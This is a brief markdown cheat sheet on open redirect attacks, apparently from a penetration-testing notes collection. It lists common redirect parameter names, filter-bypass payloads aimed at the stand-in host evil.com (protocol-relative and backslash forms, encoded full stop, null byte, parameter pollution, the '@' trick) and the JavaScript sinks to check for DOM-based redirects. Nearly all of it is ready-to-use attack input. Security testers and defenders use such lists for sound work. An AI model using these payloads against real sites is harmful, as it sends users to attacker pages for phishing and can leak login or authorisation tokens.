---
title: Open redirect
description: Attacker redirects a user to an external URL
---
## Exploit
### Common injection parameters
```css
/
?next
?url
?target
?rurl
?dest
?destination
?redir
?redirect_uri
?redirect_url
?redirect
/redirect/
/cgi-bin/redirect.cgi?
/out/
/out?
?view
/login?to
?image_url
?go
?return
?returnTo
?return_to
?checkout_url
?continue
?return_path
success
data
qurl
login
logout
ext
clickurl
goto
rit_url
forward_url
@https://
forward
pic
callback_url
jump
jump_url
click?u
originUrl
origin
Url
desturl
u
page
u1
action
action_url
Redirect
sp_url
service
recurl
j?url
url//
uri
u
allinurl:
q
link
src
tc?src
linkAddress
location
burl
request
backurl
RedirectUrl
Redirect
ReturnUrl
```
### Bypass blacklist
`http` blacklist bypass:

```css
//evil.com
```

`//` blacklist bypass:
```css
https:evil.com
```
Using `//` to bypass `//` blacklisted keyword (Browsers see `//` as `//`)
```css
\/\/evil.com/
/\/evil.com/
```
Using `/` to bypass:
```css
/\evil.com
```

URL encode Unicode full stop 。
```css
//evil%E3%80%82com
```

Null byte
```css
//evil%00.com
```
Parameter pollution
```css
?next=whitelisted.com&next=evil.com
```
Using "@" character, browser will redirect to anything after the "@"
```css
http://www.theirsite.com@evil.com/
```
### DOM based
View the page source. Common sink for open redirect:
```js
location
location.host
location.hostname
location.href
location.pathname
location.search
location.protocol
location.assign()
location.replace()
open()
element.srcdoc
XMLHttpRequest.open()
XMLHttpRequest.send()
jQuery.ajax()
$.ajax()
```
